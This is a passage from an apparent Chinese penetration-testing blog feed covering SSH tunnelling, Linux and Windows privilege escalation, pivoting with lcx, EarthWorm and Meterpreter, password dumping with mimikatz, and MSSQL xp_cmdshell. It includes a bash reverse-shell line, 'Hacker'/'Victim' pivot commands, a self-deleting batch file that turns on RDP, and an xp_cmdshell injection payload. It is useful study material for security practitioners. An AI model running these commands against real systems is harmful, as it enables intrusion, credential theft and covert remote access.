  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_phone_install_ca.png&#34; alt=&#34;手机安装证书&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;抓https数据包

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_get_https_packet1.png&#34; alt=&#34;手机访问https链接&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_get_https_packet2.png&#34; alt=&#34;burpsuite抓https包&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>http://wyb0.com/posts/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E8%84%91%E5%9B%BE/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E8%84%91%E5%9B%BE/</guid>
      <description>

&lt;h2 id=&#34;web常见漏洞:7d643aebd88a95b82f61f5520b7a5043&#34;&gt;Web常见漏洞&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/web_common_vulnerability_maps.png&#34; alt=&#34;Web常见漏洞.png&#34;&gt;
&lt;/div&gt;

</description>
    </item>
    
    <item>
      <title>Linux下SSH连接</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8BSSH%E8%BF%9E%E6%8E%A5/</link>
      <pubDate>Wed, 10 Aug 2016 11:46:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8BSSH%E8%BF%9E%E6%8E%A5/</guid>
      <description>

&lt;h3 id=&#34;0x00-ssh相关选项:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x00 SSH相关选项&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;-V 显示版本
-f 输入密码后进入后台模式
-N 不执行远程命令，用于端口转发
-D socket5代理
-L tcp转发
-C 使用数据压缩，网速快时会影响速度
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-ssh免密码登陆:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x01 SSH免密码登陆&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;A主机免密码登陆B主机：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;A主机运行：
    ssh-keygen -t rsa
    会生成两个文件~/.ssh/id_rsa和~/.ssh/id_rsa.pub
    将id_rsa.pub中的内容复制到B主机的~/.ssh/authorized_keys中
注：
    要确保B主机~/.ssh/authorized_keys权限为600
    要确保B主机~/.ssh/文件夹权限为700
    要确保上述两个文件属主是当前用户
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_create_keys.png&#34; alt=&#34;A主机生成密钥对.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_write_pub_key_to_b.png&#34; alt=&#34;将A主机产生的公钥写入B主机.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_check_authorized_keys_permissions.png&#34; alt=&#34;检查B主机authorized_keys权限.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_no_pwd_login_a_login_b.png&#34; alt=&#34;A主机免密码登陆主机B.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-ssh反向连接:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x02 SSH反向连接&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;主机A要通过SSH连接主机B：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;B上先运行：
ssh -NfR 8888:localhost:22 reber@A-IP
输入主机A的用户reber的密码后即可在A主机监听一个8888端口，它与主机B的22端口绑定
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_reverse_conn_b_run_command.png&#34; alt=&#34;主机B反向连接主机A.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;A主机运行：
ssh root@127.0.0.1 -p 8888
输入本机的root的密码即可登入主机B的root用户
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_reverse_conn_a_run_command.png&#34; alt=&#34;主机A连接主机B.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-ssh-socks5代理:e269c2bc9ccc66fa2c170f02752c5233&#34;&gt;0x03 SSH Socks5代理&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_socks5_proxy_set.png&#34; alt=&#34;设置ssh socks5.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_socks5_proxy_set_firefox.png&#34; alt=&#34;设置ssh socks5.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ssh_socks5_proxy_firefox_internet.png&#34; alt=&#34;火狐通过代理可以上网.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Linux下系统漏洞提权</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</guid>
      <description>

&lt;h3 id=&#34;0x00-linux下的提权:9e405ba2c6babe10b05fb17989641b6b&#34;&gt;0x00 Linux下的提权&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Linux下一般都是系统漏洞提权，分为以下几个步骤：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. 获取系统版本号
2. 根据系统版本号找对应exp
3. 反弹shell
4. 尝试利用
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-提权:9e405ba2c6babe10b05fb17989641b6b&#34;&gt;0x01 提权&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;获取系统版本号

&lt;ul&gt;
&lt;li&gt;获取发行版本

&lt;ul&gt;
&lt;li&gt;cat /etc/*-release&lt;/li&gt;
&lt;li&gt;cat /etc/issue&lt;/li&gt;
&lt;li&gt;cat /etc/lsb-release&lt;/li&gt;
&lt;li&gt;cat /etc/redhat-release&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;获取内核版本

&lt;ul&gt;
&lt;li&gt;cat /proc/version&lt;/li&gt;
&lt;li&gt;uname -a&lt;/li&gt;
&lt;li&gt;uname -mrs&lt;/li&gt;
&lt;li&gt;rpm -q kernel&lt;/li&gt;
&lt;li&gt;dmesg | grep Linux&lt;/li&gt;
&lt;li&gt;ls /boot | grep vmlinuz&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;根据系统版本号找对应exp

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com&#34;&gt;http://www.exploit-db.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://1337day.com&#34;&gt;http://1337day.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securiteam.com&#34;&gt;http://www.securiteam.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securityfocus.com&#34;&gt;http://www.securityfocus.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.exploitsearch.net&#34;&gt;http://www.exploitsearch.net&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://metasploit.com/modules&#34;&gt;http://metasploit.com/modules&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://securityreason.com&#34;&gt;http://securityreason.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure&#34;&gt;http://seclists.org/fulldisclosure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.google.com&#34;&gt;http://www.google.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;反弹shell

&lt;ul&gt;
&lt;li&gt;本地：&lt;code&gt;nc -l -p 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;目标机器：&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;尝试利用&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-实例:9e405ba2c6babe10b05fb17989641b6b&#34;&gt;0x02 实例&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;得到系统版本号

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_get_sys_version.png&#34; alt=&#34;得到系统版本号.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;找对应exp

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_search_exp.png&#34; alt=&#34;找相应exp.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_exp_code.png&#34; alt=&#34;保存exp源码.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;反弹shell

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_webshell_rebound_shell.png&#34; alt=&#34;反弹shell.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;提权

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_write_exp_code.png&#34; alt=&#34;下载exp源码.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_compile_exp_code.png&#34; alt=&#34;编译exp源码.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_run_exp.png&#34; alt=&#34;运行exp.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>端口转发</title>
      <link>http://wyb0.com/posts/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</guid>
      <description>

&lt;h3 id=&#34;0x00-应用场景:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x00 应用场景&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;内网IP的80端口通过端口映射到了外网IP的80端口上&lt;/li&gt;
&lt;li&gt;内网的Web服务器通过外网IP反向代理(如Nginx)
也就是说Web服务器在内网中&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-判断web是否为内网:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x01 判断Web是否为内网&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;向ping域名，查看IP是外网&lt;/li&gt;
&lt;li&gt;用webshell查看ip却是内网IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-端口转发工具:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x02 端口转发工具&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;lcx&lt;/li&gt;
&lt;li&gt;htran&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://rootkiter.com/EarthWorm/&#34;&gt;EarthWorm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;netsh&lt;/li&gt;
&lt;li&gt;reGeorg&lt;/li&gt;
&lt;li&gt;meterpreter porfwd&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x03-lcx端口转发:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x03 lcx端口转发&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Hacker：lcx.exe -listen 500 8888&lt;/li&gt;
&lt;li&gt;Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389&lt;/li&gt;
&lt;li&gt;Hacker：cmd mstsc hacker_ip:500
&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_run_lcx.png&#34; alt=&#34;hacker运行lcx.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_vimctim_run_lcx.png&#34; alt=&#34;vimctim端运行lcx.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn.png&#34; alt=&#34;hacker远程连接.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn_success.png&#34; alt=&#34;hacker远程连接成功.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x04-earchworm端口转发:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x04 EarchWorm端口转发&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Hacker：./ew -s rcsocks -l 1080 -e 8888&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Victim：./ew -s rssocks -d hacker_ip -e 8888
&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_earchworm.png&#34; alt=&#34;earchworm原理.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;1-启动earchworm:34d8041f3cf738b31ff505fafa779a00&#34;&gt;1. 启动EarchWorm&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_linux_run_ew.png&#34; alt=&#34;hacker服务器启动ew.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_victim_run_ew.png&#34; alt=&#34;victim启动ew.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_linux_get_victim_conn.png&#34; alt=&#34;victim连接hacker服务器.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;2-hacker主机使用代理:34d8041f3cf738b31ff505fafa779a00&#34;&gt;2. hacker主机使用代理&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_set_proxy1.png&#34; alt=&#34;hacker内网主机设置代理1.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_hacker_set_proxy2.png&#34; alt=&#34;hacker内网主机设置代理2.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;3-hacker内网主机连接目标的内网主机:34d8041f3cf738b31ff505fafa779a00&#34;&gt;3. hacker内网主机连接目标的内网主机&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_ew_hacker_remote_conn.png&#34; alt=&#34;hacker连接内网主机.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png&#34; alt=&#34;hacker连接内网主机成功.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x05-meterpreter:34d8041f3cf738b31ff505fafa779a00&#34;&gt;0x05 Meterpreter&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Hacker端生成payload

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_msf_creat_payload.png&#34; alt=&#34;msf生成win反弹型的payload.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;msf监听端口

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_set_metasploit_listen_port.png&#34; alt=&#34;设置metasploit监听端口.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;目标主机运行exp

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_victim_run_exp.png&#34; alt=&#34;目标主机运行exp.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;msf收到新会话

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_msf_get_conn.png&#34; alt=&#34;msf收到目标主机的连接.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;msf执行命令

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_msf_exec_command.png&#34; alt=&#34;msf远程执行命令.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>导出主机密码与开启3389</title>
      <link>http://wyb0.com/posts/%E5%AF%BC%E5%87%BA%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E4%B8%8E%E5%BC%80%E5%90%AF3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E5%AF%BC%E5%87%BA%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E4%B8%8E%E5%BC%80%E5%90%AF3389/</guid>
      <description>

&lt;h3 id=&#34;0x00-导出主机密码hash:5e20602fb71039ffb7d25cddb375ec0e&#34;&gt;0x00 导出主机密码hash&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;条件

&lt;ul&gt;
&lt;li&gt;administrator以上权限&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;工具

&lt;ul&gt;
&lt;li&gt;wce&lt;/li&gt;
&lt;li&gt;gethash&lt;/li&gt;
&lt;li&gt;hashdump&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;hash解密网站&lt;br /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.objectif-securite.ch/ophcrack.php&#34;&gt;http://www.objectif-securite.ch/ophcrack.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;上传工具得到hash

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_whoami.png&#34; alt=&#34;查看是否为管理员以上权限&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_wce.png&#34; alt=&#34;上传wce&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_get_hash.png&#34; alt=&#34;得到hash&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_get_pwd.png&#34; alt=&#34;解出密码&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-导出主机密码:5e20602fb71039ffb7d25cddb375ec0e&#34;&gt;0x01 导出主机密码&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;条件

&lt;ul&gt;
&lt;li&gt;administrator以上权限&lt;/li&gt;
&lt;li&gt;当前管理员没有注销登陆(可以通过query user命令看出)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;工具

&lt;ul&gt;
&lt;li&gt;mimikatz&lt;/li&gt;
&lt;li&gt;getpass&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;上传工具得到密码

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_whoami.png&#34; alt=&#34;查看是否为管理员以上权限&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_query_user.png&#34; alt=&#34;查看管理员是否注销登陆&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_getpass.png&#34; alt=&#34;上传getpass&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_getpass1.png&#34; alt=&#34;得到密码1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_getpass2.png&#34; alt=&#34;得到密码2&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-开启3389:5e20602fb71039ffb7d25cddb375ec0e&#34;&gt;0x02 开启3389&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;直接使用注册表

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_new_file_3389_reg.png&#34; alt=&#34;新建开3389的注册表&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_3389.png&#34; alt=&#34;开3389端口&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_3389_success.png&#34; alt=&#34;成功开启3389端口&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;写一个批处理也行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 3389.bat内容如下：
echo Windows Registry Editor Version 5.00&amp;gt;&amp;gt;3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&amp;gt;&amp;gt;3389.reg 
echo &amp;quot;fDenyTSConnections&amp;quot;=dword:00000000&amp;gt;&amp;gt;3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&amp;gt;&amp;gt;3389.reg 
echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&amp;gt;&amp;gt;3389.reg 
echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg 
regedit /s 3389.reg 
del 3389.reg
del 3389.bat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_new_file_3389_bat.png&#34; alt=&#34;新建开3389的注册表&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Windows下第三方服务提权</title>
      <link>http://wyb0.com/posts/Windows%E4%B8%8B%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Windows%E4%B8%8B%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</guid>
      <description>

&lt;p&gt;&lt;center&gt;&lt;h2&gt;MSSQL和MySQL提权&lt;/h2&gt;&lt;/center&gt;&lt;/p&gt;

&lt;h2 id=&#34;mssql提权:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;MSSQL提权&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权&lt;br /&gt;
提权条件：数据库账号是DBA权限&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;关于xp-cmdshell:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;关于xp_cmdshell&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;;--&lt;/li&gt;
&lt;/ul&gt;

